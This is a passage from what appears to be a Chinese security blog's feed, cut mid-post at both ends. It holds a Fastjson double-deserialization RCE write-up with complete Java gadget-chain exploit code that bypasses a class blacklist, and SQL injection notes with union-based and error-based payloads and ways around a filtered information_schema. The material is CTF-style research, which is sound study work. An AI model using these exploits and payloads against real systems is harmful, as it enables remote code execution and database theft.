089621a92a0d8b39473ca91f2e2cc0fc89d03617e4eb56ca22fa0a74f56754c49a4d8de27a7ea8f175a9c4405861cba6638a9ea393b0a760d4d5659d3dee8f207c4c9203b56243e9f00053e3b5c5abec209e4d9bec8b0421b</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">请输入密码</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 闲聊 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 挖洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Fastjson结合二次反序列化绕过黑名单</title>
      <link href="/2023/06/13/fastjson-jie-he-er-ci-fan-xu-lie-hua-rao-guo-hei-ming-dan/"/>
      <url>/2023/06/13/fastjson-jie-he-er-ci-fan-xu-lie-hua-rao-guo-hei-ming-dan/</url>
      
        <content type="html"><![CDATA[<h2 id="FastJson结合二次反序列化绕过黑名单"><a href="#FastJson结合二次反序列化绕过黑名单" class="headerlink" title="FastJson结合二次反序列化绕过黑名单"></a>FastJson结合二次反序列化绕过黑名单</h2><blockquote><p>本文首发于先知社区。</p></blockquote><h4 id="省流"><a href="#省流" class="headerlink" title="省流"></a>省流</h4><p>该利用链可以在<code>fastjson</code>任意版本实现<code>RCE</code>，并且借助<code>SignedObject</code>绕过第一层安全的<code>resolveClass</code>对于<code>TemplatesImpl</code>类的检查。</p><p>条件如下：</p><ol><li><code>ObjectInputStream</code>（反序列化）输入数据可控</li><li>引入<code>Fastjson</code>依赖</li></ol><h4 id="FastJson之不安全的反序列化利用"><a href="#FastJson之不安全的反序列化利用" class="headerlink" title="FastJson之不安全的反序列化利用"></a>FastJson之不安全的反序列化利用</h4><p>说起来还是<code>AliyunCTF</code>那道<code>ezbean</code>的非预期，很多师傅使用<code>FastJson#toString</code>方法触发<code>TemplatesImpl#getOutputProperties</code>实现<code>RCE</code>。</p><p><strong>gadget</strong></p><pre><code>BadAttributeValueExpException#readObjectJSONArray#toStringTemplatesImpl#getOutputProperties</code></pre><p><code>FastJson</code>反序列化并不是通过<code>ObjectInputStream.readObject()</code>还原对象，而是在反序列化的过程中自动调用类属性的<code>setter/getter</code>方法，将<code>JSON</code>字符串还原成对象。</p><p>因此从<code>FJ 1.2.49</code>开始，<code>JSONArray</code>和<code>JSONObject</code>开始重写了<code>resolveClass</code>，过滤了诸如<code>TemplatesImpl</code>的危险类。而<code>ezbean</code>那道题使用了一个不安全的<code>ObjectInputStream</code>进行反序列化。</p><p>这也就导致了选手通过引用的数据类型从而不执行<code>resolveClass</code>以绕过其对危险类的检查，导致了非预期。</p><p><strong>exp</strong></p><pre class="line-numbers language-java"><code class="language-java">        List<span class="token operator">&lt;</span>Object<span class="token operator">></span> list <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        TemplatesImpl templates <span class="token operator">=</span> GadgetUtils<span class="token punctuation">.</span><span class="token function">createTemplatesImpl</span><span class="token punctuation">(</span><span class="token string">"calc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        list<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>templates<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token comment" spellcheck="true">//第一次添加为了使得templates变成引用类型从而绕过JsonArray的resolveClass黑名单检测</span>        JSONArray jsonArray <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">JSONArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        jsonArray<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>templates<span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token comment" spellcheck="true">//此时在hash表中查到了映射，因此接下来以引用形式输出</span>        BadAttributeValueExpException bd <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BadAttributeValueExpException</span><span class="token punctuation">(</span>null<span class="token punctuation">)</span><span class="token punctuation">;</span>        ReflectionUtils<span class="token punctuation">.</span><span class="token function">setFieldValue</span><span class="token punctuation">(</span>bd<span class="token punctuation">,</span><span class="token string">"val"</span><span class="token punctuation">,</span>jsonArray<span class="token punctuation">)</span><span class="token punctuation">;</span>        list<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>bd<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//字节</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> payload <span class="token operator">=</span> SerializerUtils<span class="token punctuation">.</span><span class="token function">serialize</span><span class="token punctuation">(</span>list<span class="token punctuation">)</span><span class="token punctuation">;</span>        ObjectInputStream ois <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MyInputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ByteArrayInputStream</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ois<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h4><p>似乎这样的方式只能在目标环境使用了一个不安全的<code>ObjectInputStream</code>的场景下应用。</p><p>因为<code>templates</code>是以引用的形式来绕过<code>FJ</code>的<code>resolveClass</code>方法的黑名单检查，因此在（见<code>exp</code>第三行）必须把<code>templates</code>添加到<code>list</code>中，所以如果重写了<code>ObjectInputStream</code>过滤<code>templates</code>，这样的方法就失效了。</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MyInputStream</span> <span class="token keyword">extends</span> <span class="token class-name">ObjectInputStream</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token keyword">final</span> List<span class="token operator">&lt;</span>Object<span class="token operator">></span> BLACKLIST <span class="token operator">=</span> Arrays<span class="token punctuation">.</span><span class="token function">asList</span><span class="token punctuation">(</span><span class="token string">"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"</span><span class="token punctuation">,</span> <span class="token string">"com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter"</span><span class="token punctuation">,</span> <span class="token string">"com.sun.syndication.feed.impl.ObjectBean"</span><span class="token punctuation">,</span> <span class="token string">"import com.sun.syndication.feed.impl.ToStringBean"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token function">MyInputStream</span><span class="token punctuation">(</span>InputStream inputStream<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException <span class="token punctuation">{</span>        <span class="token keyword">super</span><span class="token punctuation">(</span>inputStream<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">protected</span> Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> <span class="token function">resolveClass</span><span class="token punctuation">(</span>ObjectStreamClass cls<span class="token punctuation">)</span> <span class="token keyword">throws</span> ClassNotFoundException<span class="token punctuation">,</span> IOException <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>BLACKLIST<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span>cls<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">InvalidClassException</span><span class="token punctuation">(</span><span class="token string">"The class "</span> <span class="token operator">+</span> cls<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">" is on the blacklist"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">resolveClass</span><span class="token punctuation">(</span>cls<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>解决方案也很简单，就是通过二次反序列化绕过。</p><h4 id="SignedObject"><a href="#SignedObject" class="headerlink" title="SignedObject"></a>SignedObject</h4><p>简单介绍下<code>SignedObject</code>，摘录自<a href="https://tttang.com/archive/1701/#toc_equalsbean">Poria师傅博客</a></p><p>当防御者重写了<code>ObjectInputStream</code>类，并且再<code>resolveClass</code>方法定义了反序列化黑名单类时，此时就需要通过二次反序列化绕过。</p><p>顾名思义，<strong>二次反序列化攻击就是在受害服务器进行第一次反序列化的过程中借助某些类的方法进行第二次反序列化。</strong>而第二次反序列化是没有<code>ban</code>恶意类的，通过这种方法间接的实现<code>bypass</code>黑名单。</p><p>阅读该类注释可知这个类可以存放一个序列化数据并且有一个属于该数据的签名。</p><pre><code>More specifically, a SignedObject contains another Serializable object, the (to-be-)signed object and its signature.</code></pre><p>再观察<code>getObject</code>方法，可以看到其中进行了一次反序列化，这完美符合了我们的要求，并且该类是<code>jdk</code>内置类。</p><p>事实上，该类主要用于加密反序列化数据，防止攻击者截获数据包从而解析序列化数据（竟然有些讽刺）。</p><pre class="line-numbers language-java"><code class="language-java">  <span class="token comment" spellcheck="true">/**     * Retrieves the encapsulated object.     * The encapsulated object is de-serialized before it is returned.     *     * @return the encapsulated object.     *     * @exception IOException if an error occurs during de-serialization     * @exception ClassNotFoundException if an error occurs during     * de-serialization     */</span>    <span class="token keyword">public</span> Object <span class="token function">getObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">throws</span> IOException<span class="token punctuation">,</span> ClassNotFoundException    <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// creating a stream pipe-line, from b to a</span>        ByteArrayInputStream b <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayInputStream</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>content<span class="token punctuation">)</span><span class="token punctuation">;</span>        ObjectInput a <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>        Object obj <span class="token operator">=</span> a<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        b<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        a<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> obj<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>而要反序列化的<code>this.content</code>可以通过构造方法赋值，并且该方法是一个相对容易触发的<code>getter</code>方法，所以<strong>问题转化为了如何触发SignedObject#getObject。</strong></p><h4 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h4><p>最好找只依赖于<code>FastJson</code>的包的<code>gadget</code>，使得攻击面最大。</p><p>而正好<code>JsonObject#toString</code>可以触发任意<code>getter</code>方法，而<code>toString</code>又可以通过<code>BadAttributeValueExpException#readObject</code>调用，因此整条链子就通了。</p><p><strong>gadget</strong></p><pre><code>* 绕过第一次的TemplatesImpl黑名单检查    BadAttributeValueExpException#readObject    JSONOBJECT#toString    SignedObject#getObject* 二次反序列化    * 引用绕过JSON自带resolveClass的黑名单检查        BadAttributeValueExpException#readObject        JSONArray#toString        TemplatesImpl#getOutputProperties            TemplatesImpl#newTransformer            TemplatesImpl#getTransletInstance            TemplatesImpl#defineTransletClasses            TemplatesImpl#defineClass</code></pre><p><strong>exp</strong></p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> gadget<span class="token punctuation">.</span>fastjson<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>JSONArray<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span>TemplatesImpl<span class="token punctuation">;</span><span class="token keyword">import</span> gadget<span class="token punctuation">.</span>doubleunser<span class="token punctuation">.</span>MyInputStream<span class="token punctuation">;</span><span class="token keyword">import</span> util<span class="token punctuation">.</span>GadgetUtils<span class="token punctuation">;</span><span class="token keyword">import</span> util<span class="token punctuation">.</span>ReflectionUtils<span class="token punctuation">;</span><span class="token keyword">import</span> util<span class="token punctuation">.</span>SerializerUtils<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>management<span class="token punctuation">.</span>BadAttributeValueExpException<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>ByteArrayInputStream<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>ObjectInputStream<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>Serializable<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>security<span class="token punctuation">.</span>KeyPair<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>security<span class="token punctuation">.</span>KeyPairGenerator<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>security<span class="token punctuation">.</span>Signature<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>security<span class="token punctuation">.</span>SignedObject<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>ArrayList<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>List<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">FJ2</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception<span class="token punctuation">{</span>        List<span class="token operator">&lt;</span>Object<span class="token operator">></span> list <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        TemplatesImpl templates <span class="token operator">=</span> GadgetUtils<span class="token punctuation">.</span><span class="token function">createTemplatesImpl</span><span class="token punctuation">(</span><span class="token string">"calc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        list<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>templates<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token comment" spellcheck="true">//第一次添加为了使得templates变成引用类型从而绕过JsonArray的resolveClass黑名单检测</span>        JSONArray jsonArray2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">JSONArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        jsonArray2<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>templates<span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token comment" spellcheck="true">//此时在handles这个hash表中查到了映射，后续则会以引用形式输出</span>        BadAttributeValueExpException bd2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BadAttributeValueExpException</span><span class="token punctuation">(</span>null<span class="token punctuation">)</span><span class="token punctuation">;</span>        ReflectionUtils<span class="token punctuation">.</span><span class="token function">setFieldValue</span><span class="token punctuation">(</span>bd2<span class="token punctuation">,</span><span class="token string">"val"</span><span class="token punctuation">,</span>jsonArray2<span class="token punctuation">)</span><span class="token punctuation">;</span>        list<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>bd2<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//二次反序列化</span>        KeyPairGenerator kpg <span class="token operator">=</span> KeyPairGenerator<span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token string">"DSA"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        kpg<span class="token punctuation">.</span><span class="token function">initialize</span><span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        KeyPair kp <span class="token operator">=</span> kpg<span class="token punctuation">.</span><span class="token function">generateKeyPair</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        SignedObject signedObject <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SignedObject</span><span class="token punctuation">(</span><span class="token punctuation">(</span>Serializable<span class="token punctuation">)</span> list<span class="token punctuation">,</span> kp<span class="token punctuation">.</span><span class="token function">getPrivate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> Signature<span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token string">"DSA"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//触发SignedObject#getObject</span>        JSONArray jsonArray1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">JSONArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        jsonArray1<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>signedObject<span class="token punctuation">)</span><span class="token punctuation">;</span>        BadAttributeValueExpException bd1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BadAttributeValueExpException</span><span class="token punctuation">(</span>null<span class="token punctuation">)</span><span class="token punctuation">;</span>        ReflectionUtils<span class="token punctuation">.</span><span class="token function">setFieldValue</span><span class="token punctuation">(</span>bd1<span class="token punctuation">,</span><span class="token string">"val"</span><span class="token punctuation">,</span>jsonArray1<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//验证</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> payload <span class="token operator">=</span> SerializerUtils<span class="token punctuation">.</span><span class="token function">serialize</span><span class="token punctuation">(</span>bd1<span class="token punctuation">)</span><span class="token punctuation">;</span>        ObjectInputStream ois <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MyInputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ByteArrayInputStream</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//再套一层inputstream检查TemplatesImpl，不可用</span>        ois<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h4><p>调试部分可见先知社区，<code>toString</code>触发<code>getter</code>那里还是没太调试明白，到时候把<code>fastjson</code>整理完发到另一篇博客上。</p><h4 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h4><p><code>fastjson</code>的利用往往通过<code>parseObject</code>触发反序列化，此次探索是在<code>readObject</code>反序列化场景下进行。真实场景下不太了解，emm可能在<code>ctf</code>中可以通过这条链子打个非预期吧。</p><p>由于笔者水平不高，希望师傅们多多指正。</p><h4 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h4><ol><li><a href="https://tttang.com/archive/1701/#toc_equalsbean">二次反序列化 看我一命通关-Ploria</a></li><li><a href="https://y4tacker.github.io/2023/04/26/year/2023/4/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E4%BA%8C/">FastJson与原生反序列化(二)-Y4tacker</a></li><li><a href="https://xz.aliyun.com/t/12485">AliyunCTF官方writeup-f1yyy</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> 安全研究 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java安全 </tag>
            
            <tag> FastJson </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入究极之总结</title>
      <link href="/2023/05/15/sql-zhu-ru-zong-jie-mei-xie-wan/"/>
      <url>/2023/05/15/sql-zhu-ru-zong-jie-mei-xie-wan/</url>
      
        <content type="html"><![CDATA[<h1 id="SQL注入-amp-amp-工具笔记"><a href="#SQL注入-amp-amp-工具笔记" class="headerlink" title="SQL注入&amp;&amp;工具笔记"></a>SQL注入&amp;&amp;工具笔记</h1><blockquote><p>很久之前上铁三培训课记的笔记。当时主要想补一补sql注入，但没想到讲的太浅了，甚至连原理都讲不明白，于是这篇比较全面的笔记就诞生了。很多类型的注入在本文都不会提及，很大篇幅是对一些trick的探索及分析。</p></blockquote><h2 id="铁三笔记"><a href="#铁三笔记" class="headerlink" title="铁三笔记"></a>铁三笔记</h2><blockquote><p>这部分只能说在听课之前我是想认真整理笔记的-.-</p></blockquote><h4 id="mysql中一些常用函数"><a href="#mysql中一些常用函数" class="headerlink" title="mysql中一些常用函数"></a>mysql中一些常用函数</h4><ul><li>database() 数据库名</li><li>version()  MYSQL数据库版本</li><li>load_file() MYSQL读取本地文件</li><li>@@datadir 读取数据库路径</li><li>@@basedir MYSQL安装路径</li><li>@@plugin_dir plugin目录路径</li><li>@@secure_file_priv 对于文件读&#x2F;写功能的描述。目录名表示仅允许对特定目录的文件进行读&#x2F;写，无表示任意读写，NULL表示禁止读写。</li></ul><h4 id="MYSQL链接字符串函数"><a href="#MYSQL链接字符串函数" class="headerlink" title="MYSQL链接字符串函数"></a>MYSQL链接字符串函数</h4><ul><li>concat(str1,str2)    concat(username,0x23,password,0x23)</li><li>concat_ws(separator,str1,str2…)   concat_ws(0x23,username,password)</li><li>group_concat(str1,str2……) 每一行的数据都显示出来</li></ul><h4 id="报错注入函数"><a href="#报错注入函数" class="headerlink" title="报错注入函数"></a>报错注入函数</h4><ul><li>ExtractValue</li><li>updataXML</li></ul><p>&#x3D;&#x3D;ExtractValue(XML_document,XPath_string):&#x3D;&#x3D;</p><p>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc</p><p>第二个参数：XPath_string(Xpath格式的字符串)</p><p>作用：从目标XML中返回包含所查询值的字符串</p><p>例如：</p><p>or extractvalue(1,payload) &#x3D;&#x3D;&gt; or extractvalue(1,concat(0x7e,(select @@version),0x7e))</p><p>&#x3D;&#x3D;UpdateXML(XML_document,XPath_string,new_value):&#x3D;&#x3D;</p><p>前两个参数和ExtractValue的参数相同</p><p>第三个参数：new_value，String格式，替换查找到的符合条件的数据</p><p>作用：改变文档中符合条件的节点的值</p><p>例如：</p><p>or updatexml(1,payload,1) &#x3D;&#x3D;&gt; or updatexml(1,concat(0x7e,(select @@version),0x7e),1)</p><h2 id="Trick"><a href="#Trick" class="headerlink" title="Trick"></a>Trick</h2><h4 id="information-schema被禁用"><a href="#information-schema被禁用" class="headerlink" title="information_schema被禁用"></a>information_schema被禁用</h4><blockquote><p>information_schema是mysql的默认库，库里有tables,columns这些关键表，里面记载着表名、列名、字段等关键信息。因此常用于sql注入，但很多waf都过滤了information、schema这些字段。</p></blockquote><p>读者可以查看自己的information_schema去了解该默认库。下图是我查看information_schema库中的columns表，可以看到里面记载着table_chema,table_name,column_name等信息(连接数据库工具为Navicat)：</p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220707225633.png" style="zoom: 50%;" /><p>默认注入点所在的表有三个字段，第二个字段有回显。因此最常见的payload为：</p><pre class="line-numbers language-mysql"><code class="language-mysql">--查数据库squirt1e' union select 1,group_concat(schema_name),3 from information_schema.schemata#--查表squirt1e' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='xxx'#--查字段squirt1e' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='xxxx'#--查数据squirt1e' union select 1,group_concat(列名1,列名2...),3 from 表名#<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们关注的无法就是查库名、表名、列名。如果information_schema被过滤，最简单的思路就是去找别的默认库。下面将介绍&#x3D;&#x3D;InnoDb&#x3D;&#x3D;存储引擎以及&#x3D;&#x3D;sys数据库&#x3D;&#x3D;。</p><h5 id="InnoDb"><a href="#InnoDb" class="headerlink" title="InnoDb"></a>InnoDb</h5><p>从MYSQL5.5.5开始，InnoDB成为其默认存储引擎。存储引擎处于文件系统之上，在数据保存到数据文件之前会传输到存储引擎（<strong>也就是存储了数据</strong>），之后按照各个存储引擎的存储格式进行存储。</p><p>而在MYSQL5.6以上的版本中，inndb增加了innodb_index_stats和innodb_table_stats两张表，这两张表中都存储了数据库和其数据表的信息，但是没有存储列名。</p><p>比如：</p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220707231744.png" style="zoom:50%;" /><p>可以看到innodb_table_states的两个重要字段为database_name以及table_name。那么我们的payload（默认有回显，三个字段）就可以换成：</p><pre class="line-numbers language-mysql"><code class="language-mysql">0'union/**/select/**/1,group_concat(table_name),3/**/from/**/information_schema.tables/**/where/**/table_schema=database()#原有的payload0'union/**/select/**/1,group_concat(table_name),3/**/from/**/mysql.innodb_table_stats/**/where/**/database_name=database()#改进的payload0'union/**/select/**/1,group_concat(table_name),3/**/from/**/mysql.innodb_index_stats/**/where/**/database_name=database()#innodb_index_stats也是一样的<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="sys"><a href="#sys" class="headerlink" title="sys"></a>sys</h5><p>mysql在5.7版本中新增了sys库，基础数据来自于performance_chema和information_schema两个库，本身数据库不存储数据，该库存在很多视图。</p><p>&#x3D;&#x3D;实验前提：我在一个新的mysql环境中只创建了test一个库，其中表名为flag，字段只有一个flag，并未设置自增。&#x3D;&#x3D;</p><p>sys这个库有很多视图，其中schema_auto_increment_columns视图值得注意，该视图的作用简单来说就是用来对表自增ID的监控。</p><p>此时输入：</p><pre class="line-numbers language-mysql"><code class="language-mysql">SELECT * FROM sys.schema_auto_increment_columns<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>结果是为空的，这是因为我的非系统表只有一个flag表，并且还没有设置自增id。但是该视图有table_shema,table_name这两个字段，因此在设置了自增id的情况下，我们的payload就可以改成：</p><pre class="line-numbers language-mysql"><code class="language-mysql">0'union/**/select/**/1,group_concat(table_name),3/**/from/**/sys.schema_auto_increment_columns/**/where/**/table_shcema=database()#改进的payload<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>尽管在真实场景中很多表是有自增id的，但我们还是想找到一个通解。</strong></p><p>简单的翻了一下sys，找到了六个视图。这六个视图均能查询到不存在自增id的表名。</p><ul><li>innodb_buffer_stats_by_table                    字段：object_schema          object_name</li><li>schema_table_statistics                               字段：table_schema            table_name</li><li>schema_table_statistics_with_buffer         字段：table_schema            table_name</li><li>x$innodb_buffer_stats_by_table                字段：object_schema          object_name</li><li>x$schema_table_statistics                           字段：table_schema            table_name</li><li>x$schema_table_statistics_with_buffer     字段：table_schema            table_name</li></ul><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202022-07-08%20003513.png" style="zoom:50%;" /><p>条条payload通罗马：</p><pre class="line-numbers language-mysql"><code 